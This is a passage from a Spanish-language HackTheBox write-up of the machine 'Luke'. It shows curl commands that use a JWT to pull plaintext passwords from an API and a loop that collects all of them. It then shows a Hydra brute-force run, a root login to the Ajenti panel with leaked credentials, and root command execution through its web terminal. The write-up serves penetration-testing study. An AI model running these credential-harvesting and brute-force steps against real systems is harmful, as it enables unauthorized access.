</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>    <span style="color:#0ff;font-weight:bold">&#34;name&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;Derry&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>    <span style="color:#0ff;font-weight:bold">&#34;Role&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;Web Admin&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>  },
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>  {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>    <span style="color:#0ff;font-weight:bold">&#34;ID&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;3&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>    <span style="color:#0ff;font-weight:bold">&#34;name&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;Yuri&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>    <span style="color:#0ff;font-weight:bold">&#34;Role&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;Beta Tester&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>  },
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>  {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>    <span style="color:#0ff;font-weight:bold">&#34;ID&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;4&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>    <span style="color:#0ff;font-weight:bold">&#34;name&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;Dory&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>    <span style="color:#0ff;font-weight:bold">&#34;Role&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;Supporter&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span>  }
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>]</span></span></code></pre></div>
<p>Otro comportamiento extraÃ±o es que podemos indicar un usuario, esto es comÃºn, pero se nos devuelve una contraseÃ±a&hellip;</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ curl -s -X GET http://10.129.96.55:3000/users/dory -H <span style="color:#0ff;font-weight:bold">&#39;Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzIyODg0MDU2LCJleHAiOjE3MjI5NzA0NTZ9.FyEpFhkz8V0rIXmjcegdmvZ2sXIdPO-OMdVa6OD0C_Y&#39;</span> | jq
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>{
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>  <span style="color:#0ff;font-weight:bold">&#34;name&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;Dory&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>  <span style="color:#0ff;font-weight:bold">&#34;password&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;5y:!xa=ybfe)/QD&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>}</span></span></code></pre></div>
<p>Vamos a recopilar estas credenciales&hellip;</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ <span style="color:#fff;font-weight:bold">for</span> user in <span style="color:#fff;font-weight:bold">$(</span>cat users.txt<span style="color:#fff;font-weight:bold">)</span>; <span style="color:#fff;font-weight:bold">do</span> curl -s -X GET http://10.129.96.55:3000/users/$user -H <span style="color:#0ff;font-weight:bold">&#39;Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzIyODg0MDU2LCJleHAiOjE3MjI5NzA0NTZ9.FyEpFhkz8V0rIXmjcegdmvZ2sXIdPO-OMdVa6OD0C_Y&#39;</span> | jq; <span style="color:#fff;font-weight:bold">done</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>{
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>  <span style="color:#0ff;font-weight:bold">&#34;name&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;Admin&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>  <span style="color:#0ff;font-weight:bold">&#34;password&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;WX5b7)&gt;/rp</span>$U<span style="color:#0ff;font-weight:bold">)FW&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>{
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>  <span style="color:#0ff;font-weight:bold">&#34;name&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;Derry&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>  <span style="color:#0ff;font-weight:bold">&#34;password&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;rZ86wwLvx7jUxtch&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>{
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>  <span style="color:#0ff;font-weight:bold">&#34;name&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;Yuri&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>  <span style="color:#0ff;font-weight:bold">&#34;password&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;bet@tester87&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>{
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>  <span style="color:#0ff;font-weight:bold">&#34;name&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;Dory&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>  <span style="color:#0ff;font-weight:bold">&#34;password&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;5y:!xa=ybfe)/QD&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>}</span></span></code></pre></div>
<h1 id="foothold">Foothold</h1>
<p>Ahora teniendo una lista de usuarios y credenciales, podemos probar a autenticarnos en <code>/management</code> o entrar en el Ajenti.</p>
<p>FijÃ¡ndonos en <a href="http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/">este</a> post&hellip;</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ hydra -L users.txt -P credentials.txt -s <span style="color:#ff0;font-weight:bold">80</span> -f 10.129.96.55 http-get /managementHydra v9.4 (c) <span style="color:#ff0;font-weight:bold">2022</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#fff;font-weight:bold">do</span> not use in military or secret service organizations, or <span style="color:#fff;font-weight:bold">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-05 23:02:21
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>[DATA] max <span style="color:#ff0;font-weight:bold">16</span> tasks per <span style="color:#ff0;font-weight:bold">1</span> server, overall <span style="color:#ff0;font-weight:bold">16</span> tasks, <span style="color:#ff0;font-weight:bold">16</span> login tries (l:4/p:4), ~1 try per task
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>[DATA] attacking http-get://10.129.96.55:80/management
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>[80][http-get] host: 10.129.96.55   login: Derry   password: rZ86wwLvx7jUxtch
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>[STATUS] attack finished <span style="color:#fff;font-weight:bold">for</span> 10.129.96.55 (valid pair found)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span><span style="color:#ff0;font-weight:bold">1</span> of <span style="color:#ff0;font-weight:bold">1</span> target successfully completed, <span style="color:#ff0;font-weight:bold">1</span> valid password found
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">9</span><span>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-08-05 23:02:22</span></span></code></pre></div>
<p>Y al acceder a <code>/management</code> vemos un hipervÃ­nculo hacia <code>/management/config.json</code>
<img src="images/Screenshot_7.png" alt="Write-up Image"></p>
<p>Vemos unas credenciales justo debajo de lo que parece ser la configuraciÃ³n del <code>Ajenti</code></p>
<p>Buscando en Google vemos que por defecto, en <code>Ajenti</code> el usuario administrador se llama <code>root</code></p>
<p>AsÃ­ que probando <code>root:KpMasng6S5EtTy9Z</code>
<img src="images/Screenshot_8.png" alt="Write-up Image"></p>
<p>Antes de probar ningÃºn exploit, vemos un apartado <code>Terminal</code> donde podemos crear una supuesta consola..
<img src="images/Screenshot_9.png" alt="Write-up Image"></p>
<p>Veo que estoy en la mÃ¡quina vÃ­ctima (no hay ningÃºn contenedor) y que encima estoy ejecutando comandos como <code>root</code>
<img src="images/Screenshot_10.png" alt="Write-up Image"></p>
<p>Y ya podrÃ­amos leer las flags. dos por el precio de una.
<img src="images/Screenshot_11.png" alt="Write-up Image"></p>
<p>Â¡Y ya estarÃ­a!</p>
<p>Happy Hacking! ğŸš€</p>

  </content>
  <p>
    
      <a href="/tags/hackthebox/">#HackTheBox</a>&nbsp;&nbsp;
    
      <a href="/tags/luke/">#Luke</a>&nbsp;&nbsp;
    
      <a href="/tags/writeup/">#Writeup</a>&nbsp;&nbsp;
    
      <a href="/tags/cybersecurity/">#Cybersecurity</a>&nbsp;&nbsp;
    
      <a href="/tags/penetration-testing/">#Penetration Testing</a>&nbsp;&nbsp;
    
      <a href="/tags/ctf/">#CTF</a>&nbsp;&nbsp;
    
      <a href="/tags/privilege-escalation/">#Privilege Escalation</a>&nbsp;&nbsp;
    
      <a href="/tags/rce/">#RCE</a>&nbsp;&nbsp;
    
      <a href="/tags/exploit/">#Exploit</a>&nbsp;&nbsp;
    
      <a href="/tags/freebsd/">#FreeBSD</a>&nbsp;&nbsp;
    
      <a href="/tags/web-fuzzing/">#Web Fuzzing</a>&nbsp;&nbsp;
    
      <a href="/tags/information-leakage/">#Information Leakage</a>&nbsp;&nbsp;
    
      <a href="/tags/password-spraying/">#Password Spraying</a>&nbsp;&nbsp;
    
      <a href="/tags/abusing-api/">#Abusing API</a>&nbsp;&nbsp;
    
      <a href="/tags/bruteforcing/">#Bruteforcing</a>&nbsp;&nbsp;
    
      <a href="/tags/abusing-ajenti-terminal/">#Abusing Ajenti Terminal</a>&nbsp;&nbsp;
    
  </p>

    </main>
    <footer>
      
  <span>Â© 2024 pointedsec</span>



    </footer>

    
</body>
</html>
